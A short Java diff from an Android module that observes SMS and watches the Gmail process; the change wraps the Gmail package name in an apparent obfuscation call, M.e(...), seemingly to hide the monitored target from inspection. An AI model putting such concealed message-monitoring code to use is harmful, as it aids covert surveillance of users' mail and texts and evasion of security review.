@@ -190,7 +190,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	class ProcessMailObserver implements Observer<ProcessInfo> {
 
-		private String pObserving = "com.google.android.gm";
+		private String pObserving = M.e("com.google.android.gm");
 
 		@Override
 		public int notification(ProcessInfo process) {
